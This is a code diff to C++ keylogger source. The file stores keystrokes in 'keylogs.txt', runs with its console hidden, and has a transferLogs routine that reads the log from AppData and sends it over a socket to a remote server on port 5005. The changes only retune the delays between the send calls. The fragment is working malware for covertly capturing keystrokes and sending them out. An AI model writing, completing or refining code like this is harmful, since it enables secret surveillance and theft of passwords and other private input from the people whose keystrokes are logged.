@@ -6,7 +6,7 @@ using namespace std;
 
 const string SERVER = "";
 const int PORT = 5005;
-const int DELAY = 500; // milliseconds
+const int DELAY = 500;
 bool noConsole = true;
 
 string logFileName = "keylogs.txt";
@@ -466,8 +466,9 @@ int transferLogs()
         ifstream LogFile(appData + logFileName);
         while (getline(LogFile, buffer)) { text += buffer + "\n"; }
 
-        Sleep(500); sender = send(objSocket, to_string(text.length()).data(), sprintf(bufsize, "%d", text.length()), 0);
-        Sleep(500); sender = send(objSocket, text.c_str(), text.length(), 0);
+        sender = send(objSocket, to_string(text.length()).data(), sprintf(bufsize, "%d", text.length()), 0);
+        Sleep(200);
+        sender = send(objSocket, text.c_str(), text.length(), 0);
 
         if (sender == 0 or sender == SOCKET_ERROR) {
             closesocket(objSocket); WSACleanup(); transferLogs();
